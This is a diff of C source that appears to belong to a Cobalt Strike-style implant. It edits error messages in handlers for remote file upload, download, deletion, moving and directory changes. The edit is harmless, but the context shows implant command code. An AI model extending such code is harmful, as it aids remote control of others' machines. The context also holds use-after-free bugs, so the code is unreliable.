@@ -9,7 +9,7 @@ wchar_t* convertToWideChar(char* input) {
 	// 第一次调用获取所需缓冲区大小
     int len = MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, NULL, 0);
     if (len == 0) {
-        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n\n", GetLastError());
+        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n", GetLastError());
         return NULL;
     }
 
@@ -20,7 +20,7 @@ wchar_t* convertToWideChar(char* input) {
     }
 
     if (MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, wideStr, len) == 0) {
-        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n\n", GetLastError());
+        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n", GetLastError());
         free(wideStr);
         return NULL;
     }
@@ -36,7 +36,7 @@ char* convertWideCharToUTF8(const wchar_t* wideStr) {
     // 包含 \0
     int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
     if (utf8Len == 0) {
-        fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n\n", GetLastError());
+        fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n", GetLastError());
         return NULL;
     }
 
@@ -47,7 +47,7 @@ char* convertWideCharToUTF8(const wchar_t* wideStr) {
     }
 
     if (WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, utf8Len, NULL, NULL) == 0) {
-        fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n\n", GetLastError());
+        fprintf(stderr, "WideCharToMultiByte failed with error:%lu\n", GetLastError());
         free(utf8Str);
         return NULL;
     }
@@ -221,7 +221,7 @@ unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t
 	file = fopen(fileName, mode);
     if (file == INVALID_HANDLE_VALUE || file == NULL) {
         free(fileName);
-		fprintf(stderr, "Failed to open file %s for writing. Error:%lu\n\n", fileName, GetLastError());
+		fprintf(stderr, "Failed to open file %s for writing. Error:%lu\n", fileName, GetLastError());
         return NULL;
     }
 
@@ -281,7 +281,7 @@ unsigned char* CmdPwd(size_t* msgLen) {
     DWORD size = GetCurrentDirectoryA(0, NULL); 
 
     if (size == 0) {
-        fprintf(stderr, "GetCurrentDirectoryA failed with error:%lu\n\n", GetLastError());
+        fprintf(stderr, "GetCurrentDirectoryA failed with error:%lu\n", GetLastError());
         return NULL;
     }
 
@@ -316,7 +316,7 @@ unsigned char* CmdCd(unsigned char* commandBuf, size_t commandBuflen, size_t* ms
     memcpy(targetWorkDirectory, commandBuf, commandBuflen);
     targetWorkDirectory[commandBuflen] = '\0';
     if (!SetCurrentDirectoryA(targetWorkDirectory)) {
-        printf("SetCurrentDirectoryA failed with error:%lu\n\n", GetLastError());
+        printf("SetCurrentDirectoryA failed with error:%lu\n", GetLastError());
         free(targetWorkDirectory);
         return NULL;
     }
@@ -381,7 +381,7 @@ unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t commandBuflen, si
     if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
         bRet = RemoveDirectoryA((LPCSTR)path);
         if (!bRet) {
-            fprintf(stderr, "RemoveDirectoryA failed with error:%lu\n\n", GetLastError());
+            fprintf(stderr, "RemoveDirectoryA failed with error:%lu\n", GetLastError());
             return NULL;
         }
     }
@@ -389,7 +389,7 @@ unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t commandBuflen, si
     else {
         bRet = DeleteFileA((LPCSTR)path);
         if (!bRet) {
-            fprintf(stderr, "DeleteFileA failed with error:%lu\n\n", GetLastError());
+            fprintf(stderr, "DeleteFileA failed with error:%lu\n", GetLastError());
             return NULL;
         }
     }
@@ -447,7 +447,7 @@ DWORD WINAPI downloadThread(LPVOID lpParam) {
         fileLen32Val = (uint32_t)largeFileSize.QuadPart;
     }
     else {
-        fprintf(stderr, "GetFileAttributesExA failed with error:%lu\n\n", GetLastError());
+        fprintf(stderr, "GetFileAttributesExA failed with error:%lu\n", GetLastError());
         free(args->fileNameBuf);
         free(args);
         return FALSE;
@@ -467,7 +467,7 @@ DWORD WINAPI downloadThread(LPVOID lpParam) {
     BeaconFormatFree(&format);
     HANDLE hFile = CreateFileA(fileNameBuf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-		fprintf(stderr, "CreateFileA failed with error:%lu\n\n", GetLastError());
+		fprintf(stderr, "CreateFileA failed with error:%lu\n", GetLastError());
         free(args->fileNameBuf);
         free(args);
         CloseHandle(hFile);
@@ -489,7 +489,7 @@ DWORD WINAPI downloadThread(LPVOID lpParam) {
     while (TRUE) {
         BOOL bRet = ReadFile(hFile, fileBuffer, MAX_DOWNLOAD_BUFFER, &bytesRead, NULL);
         if (!bRet) {
-            fprintf(stderr, "ReadFile failed with error: %lu\n\n", GetLastError());
+            fprintf(stderr, "ReadFile failed with error: %lu\n", GetLastError());
             free(args->fileNameBuf);
             free(args);
             CloseHandle(hFile);
@@ -587,7 +587,7 @@ VOID CmdFileDownload(unsigned char* commandBuf, size_t commandBuflen, size_t* ms
         NULL);                      // 不存储线程ID
 
     if (myThread == NULL) {
-        fprintf(stderr, "CreateThread failed with error: %lu\n\n", GetLastError());
+        fprintf(stderr, "CreateThread failed with error: %lu\n", GetLastError());
         free(args);
         free(args->fileNameBuf);
         return;
@@ -647,7 +647,7 @@ unsigned char* CmdFileMove(unsigned char* commandBuf, size_t commandBuflen, size
     
     if (!MoveFileA(existingFileName, newFileName))
     {
-        fprintf(stderr, "MoveFileA failed with error:%lu\n\n", GetLastError());
+        fprintf(stderr, "MoveFileA failed with error:%lu\n", GetLastError());
 		BeaconDataFree(pdatap);
         return NULL;
     }
